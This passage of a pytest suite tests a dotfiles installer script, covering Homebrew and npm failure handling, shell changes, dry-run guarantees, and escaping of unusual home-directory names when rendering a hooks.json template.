        ), res.stdout

    def test_alias_is_created_when_nothing_is_in_the_way(self, shell_env):
        local_bin = self._prepare(shell_env)

        res = run_sourced("install_apt_packages", shell_env.env)

        assert res.returncode == 0, res.stderr
        for name in ("bat", "fd"):
            assert (local_bin / name).is_symlink(), f"{name} alias was not created"

    def test_existing_alias_symlink_is_refreshed(self, shell_env):
        # A symlink is ours to replace (same rule backup_if_real applies):
        # a stale target must be re-pointed, not left dangling.
        local_bin = self._prepare(shell_env)
        stale = local_bin / "fd"
        stale.symlink_to("/nonexistent/old-fdfind")

        res = run_sourced("install_apt_packages", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert stale.is_symlink()
        assert stale.resolve().name == "fdfind"


class TestInstallHomebrew:
    """The Homebrew bootstrap must not be a bare `fetch_and_run`.

    Under `set -eo pipefail` a bare `fetch_and_run <homebrew installer>` would
    take the whole run down the moment the download failed: main() would enter
    install_os_packages and never come back, so every later step (WezTerm,
    fonts, Node, gh, pyenv, uv, glow, Docker, MCP, linters, Oh My Zsh,
    vim-plug, tmux plugins, AI tools, the shell change) would be silently
    skipped with no completion message. The arm is macOS-only, so the
    ubuntu-latest CI never executes it.
    """

    # conftest's shell_env installs a backstop `brew` stub, so
    # `command_exists brew` is TRUE by default and a test premised on brew
    # being absent would take the already-installed branch and pass
    # vacuously. Shadow the probe for brew only, leaving the real lookup in
    # place for everything else.
    _BREW_ABSENT = (
        'command_exists() { case "$1" in brew) return 1 ;; '
        '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
    )

    def test_bootstrap_failure_returns_nonzero_and_warns(self, shell_env):
        # `if` rather than a bare call: the non-zero return is the contract,
        # and a bare call would trip the harness's own `set -e` before the
        # assertions could read the status.
        res = run_sourced(
            self._BREW_ABSENT + "fetch_and_run() { return 1; }; "
            'if install_homebrew; then echo "RC=0"; else echo "RC=$?"; fi',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        # Proves the bootstrap branch was actually entered, not the
        # already-installed one.
        assert "Installing Homebrew..." in res.stdout
        assert "RC=1" in res.stdout
        assert "skipping Homebrew packages" in res.stdout

    def test_bootstrap_failure_does_not_claim_success(self, shell_env):
        res = run_sourced(
            self._BREW_ABSENT + "fetch_and_run() { return 1; }; "
            "install_homebrew || true",
            shell_env.env,
        )
        assert "Homebrew installed" not in res.stdout

    def test_already_installed_still_succeeds_quietly(self, shell_env):
        # shell_env's backstop brew stub IS the "already present" condition;
        # the guard must not cost this path its success return or its message.
        res = run_sourced('install_homebrew; echo "AFTER_HOMEBREW"', shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Homebrew already installed" in res.stdout
        assert "AFTER_HOMEBREW" in res.stdout
        assert "[WARNING]" not in res.stdout


class TestInstallOsPackages:
    """OS-specific package installation, extracted from main()'s inline
    case so the dispatch is unit-testable on its own. A bash `case` with no
    matching arm is a silent no-op, so a non-Debian Linux (OS="linux", set by
    detect_os when /etc/debian_version is absent) must warn instead of falling
    through with no packages installed."""

    def test_non_debian_linux_warns_instead_of_silently_skipping(self, shell_env):
        res = run_sourced(
            'OS=linux install_os_packages; echo "AFTER_OS_PACKAGES"', shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_OS_PACKAGES" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_ubuntu_still_dispatches_to_apt(self, shell_env):
        res = run_sourced(
            "install_apt_packages() { echo CALLED_APT; }; "
            "OS=ubuntu install_os_packages",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "CALLED_APT" in res.stdout

    def test_macos_still_dispatches_to_homebrew(self, shell_env):
        res = run_sourced(
            "install_homebrew() { echo CALLED_HOMEBREW; }; "
            "install_brew_packages() { echo CALLED_BREW_PACKAGES; }; "
            "OS=macos install_os_packages",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "CALLED_HOMEBREW" in res.stdout
        assert "CALLED_BREW_PACKAGES" in res.stdout

    def test_macos_skips_brew_packages_when_homebrew_bootstrap_fails(self, shell_env):
        # install_brew_packages needs `brew` on PATH, so running it after a
        # failed bootstrap would only produce a second wave of failures. The
        # `if` form is also what keeps `set -e` from aborting this arm on
        # install_homebrew's non-zero return.
        res = run_sourced(
            "install_homebrew() { return 1; }; "
            "install_brew_packages() { echo CALLED_BREW_PACKAGES; }; "
            'OS=macos install_os_packages; echo "AFTER_OS_PACKAGES"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_OS_PACKAGES" in res.stdout
        assert "CALLED_BREW_PACKAGES" not in res.stdout

    def test_windows_still_warns(self, shell_env):
        res = run_sourced("OS=windows install_os_packages", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "[WARNING]" in res.stdout


class TestInstallNodejs:
    """npm can legitimately be absent by the time the prefix is configured:
    the installs above are best-effort (brew/NodeSource failures only warn)
    and the windows branch never installs node at all. A bare `npm config
    set` then exits 127 and `set -e` takes the whole run down with it,
    skipping every step after install_nodejs."""

    @staticmethod
    def _env_without_node(shell_env) -> dict:
        """shell_env's PATH keeps the real one appended, so a host npm would
        satisfy `npm config set` and hide the very abort under test. Drop
        every directory that provides node or npm instead of stubbing them:
        absence is the condition, and a stub would only prove it exists."""
        env = dict(shell_env.env)
        while True:
            found = shutil.which("npm", path=env["PATH"]) or shutil.which(
                "node", path=env["PATH"]
            )
            if not found:
                return env
            drop = str(Path(found).parent)
            env["PATH"] = ":".join(p for p in env["PATH"].split(":") if p != drop)

    def test_missing_npm_does_not_abort_script(self, shell_env):
        # windows never installs node, so this is the ordinary path there.
        env = self._env_without_node(shell_env)
        res = run_sourced('OS=windows install_nodejs; echo "AFTER_NODEJS"', env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_NODEJS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_missing_npm_after_failed_install_does_not_abort_script(self, shell_env):
        shell_env.stub("brew", exit_code=1)
        env = self._env_without_node(shell_env)
        res = run_sourced('OS=macos install_nodejs; echo "AFTER_NODEJS"', env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_NODEJS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_configures_prefix_when_npm_present(self, shell_env):
        # The guard must not cost the happy path its prefix.
        shell_env.stub("node")
        shell_env.stub("npm")
        res = run_sourced('OS=macos install_nodejs; echo "AFTER_NODEJS"', shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_NODEJS" in res.stdout
        expected = f"npm config set prefix {shell_env.home}/.npm-global"
        assert expected in shell_env.calls
        assert (shell_env.home / ".npm-global").is_dir()


# go install places binaries under $HOME/go/bin (fixture $HOME, not this
# dev machine's real one). Given "install <pkg>@version", write a fake
# executable named after the package's last path segment, mirroring what a
# real `go install .../cmd/<tool>@latest` produces.
_GO_INSTALL_STUB = r"""
if [ "$1" = "install" ]; then
  pkg="${2%@*}"
  tool="${pkg##*/}"
  mkdir -p "$HOME/go/bin"
  touch "$HOME/go/bin/$tool"
  chmod +x "$HOME/go/bin/$tool"
fi
"""


class TestGoInstallPathExport:
    """install_nodejs/install_uv export PATH right after their own install
    so the immediately-following command_exists check sees what was just
    installed. install_glow and install_linters_formatters's Ubuntu
    branches must too: `go install` places binaries under ~/go/bin, which
    is not on PATH until exported, so the following command_exists check
    (and anything later in the same run) would falsely report the tool
    missing."""

    def test_glow_ubuntu_go_install_path_is_exported(self, shell_env):
        # This dev machine has a real glow on PATH; it must not mask the
        # fixture's fresh "not installed yet" state.
        env = _without_commands(shell_env.env, "glow")
        shell_env.stub("go", body=_GO_INSTALL_STUB)
        res = run_sourced('OS=ubuntu install_glow; echo "AFTER_GLOW"', env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_GLOW" in res.stdout
        assert "glow installed" in res.stdout

    def test_linters_formatters_ubuntu_go_installed_tools_visible_afterward(
        self, shell_env
    ):
        # Neutralize real ambient tools this dev machine happens to have so
        # the Ubuntu branch actually exercises its go-install paths instead
        # of finding them "already installed". gem and pip3 are left to a
        # command_exists override rather than a PATH strip: both also have
        # a copy under /usr/bin (Apple's system Python/Ruby), which
        # _without_commands refuses to remove since it also carries
        # touch/sudo/curl/dirname that the rest of this test still needs.
        env = _without_commands(
            shell_env.env, "staticcheck", "goimports", "npm", "pip", "php"
        )
        shell_env.stub("go", body=_GO_INSTALL_STUB)
        shell_env.stub("sudo")
        res = run_sourced(
            'command_exists() { case "$1" in gem|pip3) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            "OS=ubuntu install_linters_formatters; "
            "command_exists staticcheck && echo STATICCHECK_ON_PATH; "
            "command_exists goimports && echo GOIMPORTS_ON_PATH",
            env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "STATICCHECK_ON_PATH" in res.stdout, res.stdout
        assert "GOIMPORTS_ON_PATH" in res.stdout, res.stdout

    def test_linters_formatters_macos_go_installed_tools_visible_afterward(
        self, shell_env
    ):
        """The macOS branch needs the same ~/go/bin export as the Ubuntu one.

        macOS gets staticcheck from brew, so only goimports arrives through
        `go install` there. Without the export, the `command_exists goimports`
        guard right above the install would stay false forever, so every
        re-run of install.sh would fetch and rebuild goimports from scratch,
        and nothing later in the run could see it either.
        """
        env = _without_commands(shell_env.env, "goimports", "npm", "pip", "php")
        shell_env.stub("go", body=_GO_INSTALL_STUB)
        shell_env.stub("brew")
        res = run_sourced(
            'command_exists() { case "$1" in gem|pip3) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            "OS=macos install_linters_formatters; "
            "command_exists goimports && echo GOIMPORTS_ON_PATH",
            env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "GOIMPORTS_ON_PATH" in res.stdout, res.stdout


class TestMacosClangFormatFormula:
    """macOS must install the standalone `clang-format` formula, not `llvm`.

    `llvm` is keg-only (Homebrew never links it into /opt/homebrew/bin because
    macOS ships its own clang), so installing it leaves `clang-format` off PATH
    and the format hook's C/C++ branch reports it missing. The `brew list` guard
    then reports llvm "already installed" on every re-run, so the gap never
    repairs itself. `clang-format` is a regular, linked formula.
    """

    def test_installs_clang_format_formula_not_llvm(self, shell_env):
        env = _without_commands(shell_env.env, "goimports", "npm", "pip", "php")
        shell_env.stub("go", body=_GO_INSTALL_STUB)
        # Nothing is installed yet: `brew list X` fails, `brew install X` works.
        shell_env.stub("brew", body='[ "$1" = list ] && exit 1')
        # GitHub's Ubuntu runner ships php + composer under /usr/bin, which
        # _without_commands never strips. Model that host here so the test
        # proves it stays hermetic there: without php|composer in the override
        # below, the run would reach a real `composer global require`.
        shell_env.stub("php")
        shell_env.stub("composer")
        res = run_sourced(
            'command_exists() { case "$1" in gem|pip3|php|composer) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            "OS=macos install_linters_formatters",
            env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "brew install clang-format" in shell_env.calls, shell_env.calls
        assert "brew install llvm" not in shell_env.calls, shell_env.calls
        assert not [c for c in shell_env.calls if c.startswith("composer")], (
            shell_env.calls
        )


class TestChangeShell:
    def test_chsh_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("zsh")
        shell_env.stub("chsh", exit_code=1)
        env = dict(shell_env.env)
        env["SHELL"] = "/bin/bash"

        res = run_sourced('change_shell; echo "AFTER_CHANGE_SHELL"', env)

        assert res.returncode == 0, res.stderr
        assert "AFTER_CHANGE_SHELL" in res.stdout
        assert "chsh failed" in res.stdout

    # macOS ships /bin/zsh (Apple's default-shell zsh) alongside a homebrew
    # one, so a PATH strip can't make `zsh` genuinely unresolvable without
    # also taking /bin -- and therefore bash itself -- off PATH. Shadow the
    # two lookup mechanisms `change_shell` actually uses instead: `which`
    # (`$(which zsh)`) and `command_exists` (the guard).
    _ZSH_ABSENT = (
        'which() { [ "$1" = "zsh" ] && return 1 || command which "$@"; }; '
        'command_exists() { [ "$1" = "zsh" ] && return 1 '
        '|| command -v "$1" >/dev/null 2>&1; }; '
    )

    def test_missing_zsh_warns_and_never_invokes_chsh(self, shell_env):
        # Without a `command_exists zsh` guard, `$(which zsh)` resolves to
        # "" when zsh isn't installed, and `[ "$SHELL" != "" ]` is true, so
        # the function would proceed straight to `chsh -s ""`.
        shell_env.stub("chsh")
        env = dict(shell_env.env)
        env["SHELL"] = "/bin/bash"

        res = run_sourced(
            self._ZSH_ABSENT + 'change_shell; echo "AFTER_CHANGE_SHELL"', env
        )

        assert res.returncode == 0, res.stderr
        assert "AFTER_CHANGE_SHELL" in res.stdout
        assert "[WARNING]" in res.stdout
        assert not any(c.startswith("chsh") for c in shell_env.calls)

    @pytest.mark.parametrize("dry_run", ["0", "1"])
    def test_a_login_shell_that_is_another_zsh_is_already_zsh(self, shell_env, dry_run):
        """A second zsh earlier on PATH does not make the login shell "not zsh".

        macOS logs in with /bin/zsh, and install_brew_packages itself puts a
        homebrew zsh first on PATH, so a `$SHELL != $(which zsh)` comparison
        holds on every run: chsh would be attempted again (a password prompt),
        fail because /opt/homebrew/bin/zsh is not in /etc/shells, and print
        advice to add it there -- for a user whose shell never needed changing.
        """
        shell_env.stub("zsh")  # which zsh -> the stub dir, not /bin/zsh
        env = {**shell_env.env, "SHELL": "/bin/zsh", "DRY_RUN": dry_run}

        res = run_sourced("change_shell", env)

        assert res.returncode == 0, res.stderr
        assert "already zsh" in res.stdout
        assert "would change" not in res.stdout
        assert not any(c.startswith("chsh") for c in shell_env.calls)

    def test_missing_zsh_warns_in_dry_run_too(self, shell_env):
        env = {**shell_env.env, "DRY_RUN": "1", "SHELL": "/bin/bash"}

        res = run_sourced(
            self._ZSH_ABSENT + 'change_shell; echo "AFTER_CHANGE_SHELL"', env
        )

        assert res.returncode == 0, res.stderr
        assert "[WARNING]" in res.stdout


class TestHooksJsonTemplate:
    def test_renders_hooks_json_with_resolved_home(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        rendered = home / ".codex/hooks.json"
        assert rendered.is_file()
        assert not rendered.is_symlink()
        assert not (home / ".codex/hooks.json.template").exists()

        content = rendered.read_text(encoding="utf-8")
        assert "__HOME__" not in content
        assert str(home) in content
        assert json.loads(content)  # must still be valid JSON
        # bash-review is launched through the fail-closed launcher (wiring
        # pinned in test_config_wiring.py). The python3-not-bare-python rule
        # (bare `python` does not exist on stock Ubuntu or Homebrew installs,
        # same rationale as the MCP registration) lives inside the
        # launcher, exercised by test_bash_review_launcher.py; the rendered
        # config itself must still never invoke bare `python`.
        assert "bash-review-launcher.sh'" in content
        assert "python '" not in content

    @pytest.mark.parametrize("dry_run", ["0", "1"])
    def test_sed_metacharacters_in_home_render_literally(
        self, shell_env, tmp_path, dry_run
    ):
        """$HOME must be escaped in the sed REPLACEMENT.

        `&` there means "the matched text", so /Users/a&b would render as
        /Users/a__HOME__b -- a path that does not exist, written without a
        word of warning. `|` is the s||| delimiter, so /home/a|b would make sed
        fail ("bad flag in substitute command") and set -e would take the whole
        installer down. `&` is a legal Windows user name character.
        """
        home = tmp_path / "we&ird|home"
        home.mkdir()
        env = {**shell_env.env, "HOME": str(home), "DRY_RUN": dry_run}

        res = run_sourced("_link_codex_config", env)

        assert res.returncode == 0, res.stderr
        if dry_run == "1":
            assert "would render" in res.stdout
            return
        content = (home / ".codex/hooks.json").read_text(encoding="utf-8")
        assert "__HOME__" not in content
        assert f"{home}/.codex/hooks/" in content
        assert json.loads(content)

    # $HOME lands in three nested languages at once: a shell single-quoted word
    # ('__HOME__/...'), inside a JSON string, inside a sed replacement. Each
    # layer needs its own escape: an unescaped `'` (a legal user name, e.g.
    # o'brien on Windows/WSL) closes the shell quote in every hook command, and
    # a `"` or `\` breaks the JSON itself -- Codex would load no hooks at all.
    _AWKWARD_HOMES = [
        pytest.param("o'brien", id="single-quote"),
        pytest.param('say "hi"', id="double-quote"),
        pytest.param("back\\slash", id="backslash"),
        pytest.param("a&b", id="ampersand"),
        pytest.param("p|pe", id="pipe"),
        pytest.param("with space", id="space"),
        pytest.param('o\'b "q" \\ & | $x', id="all-at-once"),
    ]

    @staticmethod
    def _hook_commands(data):
        return [
            hook["command"]
            for groups in data["hooks"].values()
            for group in groups
            for hook in group["hooks"]
        ]

    @pytest.mark.parametrize("name", _AWKWARD_HOMES)
    def test_awkward_home_renders_runnable_hook_commands(
        self, shell_env, tmp_path, name
    ):
        home = tmp_path / name
        home.mkdir()
        env = {**shell_env.env, "HOME": str(home)}

        res = run_sourced("_link_codex_config", env)

        assert res.returncode == 0, res.stdout + res.stderr
        data = json.loads((home / ".codex/hooks.json").read_text(encoding="utf-8"))
        commands = self._hook_commands(data)
        assert commands
        for cmd in commands:
            syntax = subprocess.run(
                ["bash", "-n", "-c", cmd], capture_output=True, text=True
            )
            assert syntax.returncode == 0, (cmd, syntax.stderr)
            script = shlex.split(cmd)[-1]
            assert script.startswith(f"{home}/.codex/hooks/"), (cmd, script)
            # The literal path, reachable through the linked hooks dir.
            assert Path(script).is_file(), script

    # Both branches must render through ONE helper: the dry-run's cmp against
    # what the real run wrote only reports "up to date" when the two renders
    # are byte-identical, awkward characters included.
    def test_dry_run_render_matches_the_real_render(self, shell_env, tmp_path):
        home = tmp_path / 'o\'b "q" \\ & | $x'
        home.mkdir()
        env = {**shell_env.env, "HOME": str(home)}

        real = run_sourced("_link_codex_config", env)
        assert real.returncode == 0, real.stdout + real.stderr
        assert json.loads((home / ".codex/hooks.json").read_text(encoding="utf-8"))

        dry = run_sourced("_link_codex_config", {**env, "DRY_RUN": "1"})
        assert dry.returncode == 0, dry.stdout + dry.stderr
        assert "hooks.json already up to date" in dry.stdout, dry.stdout
        assert "would render" not in dry.stdout, dry.stdout

    # The shell-quoting layer assumes every placeholder sits inside a
    # single-quoted word; JSON cannot carry a comment saying so.
    def test_every_home_placeholder_is_inside_a_single_quoted_word(self):
        text = (REPO_ROOT / ".codex/hooks.json.template").read_text(encoding="utf-8")
        preceding = re.findall(r"(.)__HOME__", text)
        assert preceding
        assert set(preceding) == {"'"}, (
            "install.sh escapes $HOME for a '...' shell word; a __HOME__ outside "
            "one needs a different escape"
        )

    def test_rerun_regenerates_hooks_json(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0, first.stderr
        second = run_sourced("create_symlinks", shell_env.env)
        assert second.returncode == 0, second.stderr

        rendered = home / ".codex/hooks.json"
        assert rendered.is_file()
        assert not rendered.is_symlink()
        assert str(home) in rendered.read_text(encoding="utf-8")


class TestHooksJsonDryRunDiff:
    """The DRY_RUN branch must not unconditionally print "would render": like
    the real branch's `cmp -s` check that skips a no-op re-render, it reports
    "already up to date" when the rendered output matches what is on disk."""

    @staticmethod
    def _hooks_json_lines(stdout: str) -> list:
        return [ln for ln in stdout.splitlines() if "hooks.json" in ln]

    def test_dry_run_reports_unchanged_when_content_matches(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0, first.stderr

        env = {**shell_env.env, "DRY_RUN": "1"}
        second = run_sourced("create_symlinks", env)
        assert second.returncode == 0, second.stderr

        lines = self._hooks_json_lines(second.stdout)
        # Match the message itself, not "unchanged": pytest names tmp_path
        # after the test, so every line carrying $HOME contains that word
        # and the assertion could not fail.
        assert any("already up to date" in ln for ln in lines), second.stdout
        assert not any("would render" in ln for ln in lines), second.stdout

    def test_dry_run_reports_would_render_when_content_differs(self, shell_env):
        home = shell_env.home
        (home / ".codex").mkdir(parents=True)
        (home / ".codex/hooks.json").write_text("{}\n", encoding="utf-8")

        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        lines = self._hooks_json_lines(res.stdout)
        assert any("would render" in ln for ln in lines), res.stdout
        assert not any("already up to date" in ln for ln in lines), res.stdout

    def test_dry_run_touches_nothing_either_way(self, shell_env):
        # The diff check itself must stay read-only: no write to HOME.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        env = {**shell_env.env, "DRY_RUN": "1"}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert not (home / ".codex/hooks.json").exists()


# A curl stub that "downloads" a script by writing it to curl's `-o` target.
# The written script echoes its own path ($0) and positional args ($*) so the
# tests can assert both that it ran and how fetch_and_run invoked it.
_CURL_WRITES_SCRIPT = r"""
out=""; prev=""
for a in "$@"; do
  [ "$prev" = "-o" ] && out="$a"
  prev="$a"
done
[ -n "$out" ] && printf '%s\n' 'echo "RAN tmp=$0 args=[$*]"' > "$out"
"""


class TestUsageAndArgs:
    """`--help` / `--dry-run` / bad-flag handling in main()'s arg parser.

    Parsing runs before the checkout guard so --help works anywhere, and
    before the first side effect so nothing is touched on the error paths.
    """

    def test_help_prints_usage_and_does_nothing(self, shell_env):
        res = run_sourced("main --help", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Usage:" in res.stdout
        assert "--dry-run" in res.stdout
        # --help returns before any installation step.
        assert "Creating symbolic links" not in res.stdout
        assert list(shell_env.home.iterdir()) == []

    def test_short_help_flag(self, shell_env):
        res = run_sourced("main -h", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Usage:" in res.stdout

    def test_unknown_option_errors_with_exit_2(self, shell_env):
        # `set -e` (from the sourced script) turns main's `return 2` into the
        # shell's exit status directly.
        res = run_sourced("main --bogus", shell_env.env)
        assert res.returncode == 2, res.stdout + res.stderr
        assert "Unknown option: --bogus" in res.stdout
        assert list(shell_env.home.iterdir()) == []

    def test_unexpected_positional_errors_with_exit_2(self, shell_env):
        res = run_sourced("main extra-arg", shell_env.env)
        assert res.returncode == 2, res.stdout + res.stderr
        assert "Unexpected argument: extra-arg" in res.stdout


class TestDryRun:
    """--dry-run must preview the destructive/user-specific work (symlinks,
    backups, rendered configs, chsh) while touching NOTHING on disk."""

    def test_create_symlinks_leaves_fresh_home_empty(self, shell_env):
        # The discriminating check: any unguarded mkdir/ln/cp/render/backup
        # would leave a trace here. HOME must be byte-for-byte untouched.
        home = shell_env.home
        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert list(home.iterdir()) == [], list(home.iterdir())
        # ...and it announced the plan.
        assert "[DRY-RUN]" in res.stdout
        assert "would link" in res.stdout

    def test_create_symlinks_does_not_disturb_existing_entries(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".zshrc").write_text("keep me\n", encoding="utf-8")
        before = sorted(p.name for p in home.iterdir())

        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        assert sorted(p.name for p in home.iterdir()) == before
        # The real .zshrc is neither backed up nor replaced with a symlink.
        assert not (home / ".zshrc").is_symlink()
        assert (home / ".zshrc").read_text(encoding="utf-8") == "keep me\n"
        assert list(home.glob(".dotfiles_backup_*")) == []

    def test_main_dry_run_leaves_home_untouched(self, shell_env):
        # Full flow: detect OS, plan symlinks, skip package/tool installs,
        # plan shell change -- all without writing to HOME.
        home = shell_env.home
        res = run_sourced("main --dry-run", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert list(home.iterdir()) == [], list(home.iterdir())
        assert "Skipping package and tool installation" in res.stdout
        assert "Dry-run complete" in res.stdout

    def test_unstubbed_package_managers_hit_the_backstop(self, shell_env):
        # The shell_env backstop stubs must intercept system-mutating tools
        # even when a test forgets to stub them: otherwise a leaky dry-run gate
        # could reach the REAL host `brew` with HOME inside the pytest tmp dir,
        # and Homebrew would "upgrade" the font cask by relocating the user's
        # real font files into the doomed tmp HOME. (This cannot be shown
        # failing first: observing it means executing the real package manager
        # and mutating the host.)
        res = run_sourced("OS=macos install_fonts", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert any(c.startswith("brew install --cask") for c in shell_env.calls), (
            "install_fonts must hit the brew backstop stub, never the host brew"
        )

    def test_zsh_secrets_preview_reflects_an_existing_file(self, shell_env):
        # The preview must announce the decision it would make, not just the
        # write -- "would create" on a machine that already has the file is
        # the same misreport the hooks.json preview must avoid (see
        # TestHooksJsonDryRunDiff).
        secrets = shell_env.home / ".zsh_secrets"
        secrets.write_text("export GEMINI_API_KEY=real-key\n", encoding="utf-8")

        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert "[DRY-RUN] would keep existing" in res.stdout
        assert "would create" not in res.stdout
        assert secrets.read_text(encoding="utf-8") == "export GEMINI_API_KEY=real-key\n"

    # The real run removes a config.toml symlink and then finds nothing there,
    # so it seeds. The preview removes nothing, so it must not take the LIVE
    # link, still resolving, for an existing file and report "Keeping existing
    # config.toml" -- the opposite plan, and without the [DRY-RUN] prefix.
    def test_codex_config_symlink_preview_matches_the_real_seed(
        self, shell_env, tmp_path
    ):
        old = tmp_path / "old-checkout-config.toml"
        old.write_text("[old]\n", encoding="utf-8")
        homes = {}
        for mode in ("0", "1"):
            home = tmp_path / f"home-dry{mode}"
            (home / ".codex").mkdir(parents=True)
            (home / ".codex/config.toml").symlink_to(old)
            env = {**shell_env.env, "HOME": str(home), "DRY_RUN": mode}
            res = run_sourced("_link_codex_config", env)
            assert res.returncode == 0, res.stdout + res.stderr
            homes[mode] = (home, res.stdout)

        real_home, real_out = homes["0"]
        assert "Seeded config.toml" in real_out
        assert not (real_home / ".codex/config.toml").is_symlink()

        dry_home, dry_out = homes["1"]
        assert "[DRY-RUN] would seed" in dry_out
        assert "Keeping existing config.toml" not in dry_out
        assert (dry_home / ".codex/config.toml").readlink() == old
        assert old.read_text(encoding="utf-8") == "[old]\n"

    def test_codex_config_keep_is_previewed_as_a_dry_run_line(self, shell_env):
        home = shell_env.home
        (home / ".codex").mkdir(parents=True)
        (home / ".codex/config.toml").write_text("[live]\n", encoding="utf-8")

        res = run_sourced("_link_codex_config", {**shell_env.env, "DRY_RUN": "1"})

        assert res.returncode == 0, res.stdout + res.stderr
        keep = [ln for ln in res.stdout.splitlines() if "config.toml" in ln]
        assert keep and all("[DRY-RUN]" in ln for ln in keep), res.stdout
        assert "would keep existing" in res.stdout

    # An old-layout ~/.oh-my-zsh/custom symlink is replaced by a fresh, empty
    # real directory before the theme is linked. The preview replaces nothing,
    # so link_entry would look THROUGH the old link: into the checkout it would
    # report the theme as skipped ("resolves into the checkout"), and into a
    # directory elsewhere it would announce a backup -- while the real run
    # simply links it.
    # Driven against a COPY of the checkout: the `-ef` guard only fires for the
    # sourced script's own tree, and the real branch must never touch the repo.
    @pytest.mark.parametrize("link_into", ["checkout", "elsewhere"])
    def test_symlinked_omz_custom_preview_matches_the_real_theme_link(
        self, shell_env, tmp_path, link_into
    ):
        checkout = tmp_path / "checkout"
        checkout.mkdir()
        shutil.copy2(INSTALL, checkout / "install.sh")
        shutil.copytree(REPO_ROOT / ".oh-my-zsh", checkout / ".oh-my-zsh")
        themes = sorted(
            p.name for p in (checkout / ".oh-my-zsh/custom/themes").iterdir()
        )
        assert themes
        if link_into == "checkout":
            custom_target = checkout / ".oh-my-zsh/custom"
        else:
            custom_target = tmp_path / "elsewhere/custom"
            (custom_target / "themes").mkdir(parents=True)
            for name in themes:
                (custom_target / "themes" / name).write_text("hand-edited\n")

        outputs = {}
        for mode in ("0", "1"):
            home = tmp_path / f"home-dry{mode}"
            (home / ".oh-my-zsh").mkdir(parents=True)
            (home / ".oh-my-zsh/custom").symlink_to(custom_target)
            res = subprocess.run(
                [
                    "bash",
                    "-c",
                    f'source "{checkout / "install.sh"}"\nlink_oh_my_zsh_theme',
                ],
                capture_output=True,
                text=True,
                env={**shell_env.env, "HOME": str(home), "DRY_RUN": mode},
                timeout=120,
            )
            assert res.returncode == 0, res.stdout + res.stderr
            outputs[mode] = res.stdout

        for name in themes:
            assert f"Linked {name}" in outputs["0"], outputs["0"]
            assert re.search(
                rf"\[DRY-RUN\] would link \S*/custom/themes/{re.escape(name)} ",
                outputs["1"],
            ), outputs["1"]
        assert "Backing up" not in outputs["0"]
        assert "would back up" not in outputs["1"], outputs["1"]
        assert "resolves into the checkout" not in outputs["1"], outputs["1"]
        assert (tmp_path / "home-dry1/.oh-my-zsh/custom").is_symlink()

    def test_change_shell_does_not_invoke_chsh(self, shell_env):
        shell_env.stub("zsh")
        shell_env.stub("chsh")
        env = {**shell_env.env, "DRY_RUN": "1", "SHELL": "/bin/bash"}
        res = run_sourced("change_shell", env)
        assert res.returncode == 0, res.stderr
        assert "[DRY-RUN]" in res.stdout
        assert not any(c.startswith("chsh") for c in shell_env.calls)

    def test_dry_run_is_not_the_default(self, shell_env):
        # A plain create_symlinks (no DRY_RUN) still performs the work: the
        # guards must gate on DRY_RUN=1, never fire by default.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert (home / ".zshrc").is_symlink()

    def test_non_numeric_dry_run_is_rejected(self, shell_env):
        """A typo'd DRY_RUN must abort, not silently do the real work.

        Every guard spells `[ "$DRY_RUN" -eq 1 ]`, an INTEGER comparison.
        Given `DRY_RUN=true`, `[` fails with "integer expression expected"
        and, because the guard sits in a condition, `set -e` does not fire --
        every one of them falls through to the real branch. The header
        comment invites exactly this ("env-overridable so tests can exercise
        a single function in dry-run"), so the value is user-supplied and a
        non-numeric one is a reachable typo: the run relinks HOME, moves the
        user's real dotfiles into a backup dir and previews nothing, while
        the errors scroll past as noise.
        """
        env = {**shell_env.env, "DRY_RUN": "true"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode != 0, (
